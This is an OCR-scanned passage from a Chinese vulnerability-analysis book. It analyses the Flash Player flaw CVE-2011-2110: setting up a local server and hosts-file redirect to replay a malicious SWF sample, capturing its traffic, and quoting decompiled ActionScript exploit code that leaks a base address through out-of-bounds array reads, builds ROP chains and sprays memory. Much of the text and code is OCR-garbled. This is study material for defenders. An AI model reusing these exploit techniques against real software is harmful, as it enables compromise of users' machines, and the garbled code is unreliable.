72
sm32.0
m098:
GAMEDT P/B. OQB8, RBR
DKANO4LDK (E
xogstx xriw)
2CUINT.Dt FOA oaNa)
UA.KN (K8I
PIO(5.0XI Seg8N)
SAM(.(XE [RSR
SML[ (9)
MU(XT (DR
TASKT RIA
hnysk
图8-15金山火眼的扫描结果
---
## Page 390
第8章数组越界访问漏润分析371
8.3.4
搭建服务器重现漏洞场景
分析环境如表8-2所示。
表8-2分析环境
推荐使用的环境
备注
操作系统
Windows 7 SP1
简体中文版
浏览器
Intemet Explore 8
调试器
Immunity Debugger
版本号：1.85
反汇编器
IDA Pro
版本号：6.1
漏洞软件
Adobe Flash Player
ActiveX控件版本号：10.3.181.22
SWF反编译器
JPEXS Free Flash Decompiler
版本号：2.1.0u2
Flash编译器
Adobe Flash Builder
版本号：4.7
SWF样本会从www.amcia.
不的
2011-211
R cd.lot
info下载其他文件，而且样本只
运行在服务端，但由于恶意站点
已失效无法访问，为方便动态调
试，此时就需要自行搭建服务
php
器，将样本放置在服务器上。在
图8-16搭建服务器放置cd.txt文件
放置样本时，应该注意在根目录
下添加crossdomain.xml文件，否
则无法正常执行swf样本，同时
在根目录下放置包含cd.txt的
down文件来，以便完成样本的下
f Thss ie a seple 8087s f11e uoed bg Iscr
eoft TCF/IF Eer Iindes
载动作。笔者是在Mac系统上搭
F Thse file eosteite the mappings of DF addreroes to bost ssmes. Eacb
建的Apache服务器，放置的样本
hoet
ing hort
文件及目录如图8-16所示，
 r9ace
ote
由于SWF样本会访间www.
amcia.info站点，因此笔者修改
f Fer essmp1t1
Windows 7下的host文件，将
102.54.94.97
rhiso-scme
com
f rosro+ asrvet
www.amcia.info指向搭建的服务
器IP（笔者用的内网中的
192.168.1.102），如图8-17所示。
127.0.0.1
loca
完成以上的环境搭建后，我
111
们用 IE8 打 开 http://www.amcia.
图8-17配置host文件
---
## Page 391
372漏洞战争：软件漏洞分析精要
info/cve-2011-2110.html，同时用Fiddler抓取HTTP数据包，从图8-18中可以看到，所有的网络请求都
顺利完成。
w.o.e1-2011210.e
634
280
290
HITP
ALUH
count23.51yes-0om
dk0,a8px7id=23213*299680go=1
200
HTP
www.amcia.nfo
Jmair.swf7info=02etbr525353caa0ad.
6,322
private
et,hm
290
HTTP
csunt23.51yes.gl
kortigf
SAE.
ceRcab
国·
民
290
290
HITP
HTTP
count23.51yes.com
ww.anGa.infe/dowejod.t
pue66DC12C2=P(s9/es)
Biocatio.
34,043
privste
图8-18噢探网络数据包
用IE打开后，会出现scvhost.exe前溃的情况，如图8-19所示，最初笔者以为是系统不稳定导致的，
但是每次用IE访间cve-2011-2110.html都是必现，因此怀疑这里跟漏洞触发相关，于是，用Malware
Defencer查看此scvhost.exe的调用者，以下是一些跟IE进程相关的行为记录。从图8-20中可以发现，
scvhostexe是由IE启动的，并且它不是微软官方的scvhost.exe，而是临时目录下创建的程序，只是病
毒作者写的scvhostexe程序兼容性不够好，才导致在Windows7SP1系统上崩溃。如果读者对比前面
分析的decode_file.bin与scvhostexe这两个文件MD5值，发现两者是一致的，因此基本可以确定是样
本利用漏洞执行的下载并解密的恶意程序scvhost.exe。
Q
Lee B停比工作
图8-19
程序渍
图8-20通过MalwareDefencer查看进程行为
---
## Page 392
第8章数组越界访问漏润分析373
8.3.5
通过修改样本代码定位漏洞
在前面步骤中已经能够触发漏洞并执行恶意程序，但分析漏洞时，我们需要跟踪触发漏洞时的
第一现场。有时，一些漏洞写得不够稳定，可能打开后就崩溃，这种情况反面更方便分析漏洞：但
有时漏润写得比较稳定，直接打开后就运行恶意程序了，对于这种情况，尤其是SWF文件，我们可
以通过修改EXPLOIT中的ActionScript代码，重编译出swf，使得在调试程序时触发异常，以方便我们
进一步分析漏洞成因。
样本中用于触发漏洞的代码位于test函数中，简要分析下关键代码。
如图8-21所示，程序通过越界索引rest参数数组，利用获取的值经过一定计算得到bascaddr地址，
然后再利用它来构造ROP指令，如图8-22所示。其实到这里，从利用代码来看，基本可以推测出本
次漏润主要就是由于可变参数的数组存在越界访问漏洞导致的。
125.
pul5cfunction test.rest）：ved（//使用rest数组参数以接受任意多个以通号分隔的步数
127,
128.
fe = ugn:“axot” Jen
129,
//路界意引rest[ex40]值，开依次精放dString，FLost数指英型，然后航子_oc2
139,
var _1oc2_:Nuaber • nex Nueber(parseFloat (String(rest[@xteeeeeet])));
131.
132.
133.
var _1oc3_1Bytelrray * new Byteleray()
134,
_1oc3_position + 8j
135,
_1oc3_wr1teDouble（_1oc2_）1// _Loc2g人_Loc3REF元ift中
136.
137.
// 通过_Loc3计算出eseor量相当于一处地比的但息提露，然后用besroddr采构造RoP指分
var _1oc4_uinmt • _1oc3_[0] * eh3eo0 + _1oc3_[1] * ebx3eee + _1oc3_[2] * ex1ee + _1oc3_[3];
138,
139,
this.baseadr • _1oc4_;
1.60,
thds.code-position • 0;
143.
thds,code-endian + Endan,LITTLE_DDSAN;
142.
thds.code-aritent(this.pobj - 1 + 16 + 1024 * 4 * 18e);
143,
thds.code-endian + EndLanBIs_e8;
144.
145.
this,code-writeinsignednt(ewt3414141);
this.code,wr1teUns1gnedLnt (ex41434341);
146,
thds,code.eriteinsigredIst(x4G4041);
147.
148.
_1oc8_ · 8;
//构造一长净包介ex41434341
149.
150.
htle(_10c8_ < 1824 * 1ee)
151.
this,cede.eritensignedInt(es414141)
152.
_loct_**;
153.
图8-21通过越界索引数组获取baseaddr地址
---
## Page 393
374漏洞战争：软件漏洞分析精要
lities.
sersSos-t
verCase() x
*Gx 19,3,181,23°)
*xin 18,3,181,14° 11 Capat
Case() -*+ *vdn 38,3,181,22* 11
ist.
337.
139.
(,t′te*°et v, ** ()a
061.
tlittes-piayertyoe.
[xavT1De, * ()ase2
162.
143
xthg_eas_ess_ret + this-baseaddr - 4g47e53)
// 通
164.
thds.achg_ts_es1_ret + t3ss.baseaddr - 1042921)
155.
156.
this-gte_tas_ret - tkis.aseaddr
-4217672,
eaddr + 681979 + 52;
thds-J*P,
4589963;
158.
- 4217760;
176.
171.
4217679
172.
图8-22构造ROP指令
在程序的后面还有两次通过越界索引rest参数数组获取信息泄露地址，如图8-23所示。
197.
var _l_  ((sti(st)
588,
_1c6_eritaouie(_1oc5_);
viar _loct_:tlyteArray = sev lytelemay()1
589.
s9e.
591.
thls.poby • _1oc7,
532.
_1et8, • #)
591.
this.ptj = 
this-peb] + 54;
594.
595.
_10t8_ * #;
hL1e(_1ecR_ < 88)
596,
5F7
_iat,**j
1teban(ts-ge()s
594.
sae.
181.
0e2.
_lec)_-pesition
e _19c9_:Ni
_lec3_-vriteooueie(_1ec9_);
_loc4, • _1oc3,[e] * exeeee
ses.
thls.petj • _lac4_ + 2;
 +_1oc3_[1] * ex
* _1oc3_[3]:
686.
ExternalInte
+face,cal1(*,thisgee-to5tring(a8])s
667
606
hile(_1oct, c s8e)
_loct, - #j
ses.
638.
this-code
riteDnt (this-petg]s
611.
_iocl,**;
632
图8-23利用多次越界数组获取泄露地址
---
## Page 394
第8章数组越界访问漏洞分析375
可以看到，样本中的主要利用代码就是那三处信息泄露，为了触发程序崩溃，笔者修改了第1处
信息泄露，修改rest的索引值为0x41414141（该值不是越大越好，比如0xFFFFFFFF就不会导致前涉，
可以手工测试几次，找到能够使其前溃的索引值），然后重编译成SWF文件。
var _1oc2_:Number = new Number(parseF1oat(String(rest[ex41414141])));
笔者直接在Mac上用Adobe Flash Builder创建一个新项目，然后将前面的反编译代码复制到src目
录下的Main.as文件中，在修改完参数数组索引值0x41414141后再重新编译，如图8-24所示。
0-0-9.Q-0
1a(1,
-
图8-24用Adobe Flash Builder编辑代码
接着，用生成的SWF文件替换原有的main.swf，重新用IE打开后程序崩溃，如图8-25所示。
 关889
+R
图8-25导致IE前溃
---
## Page 395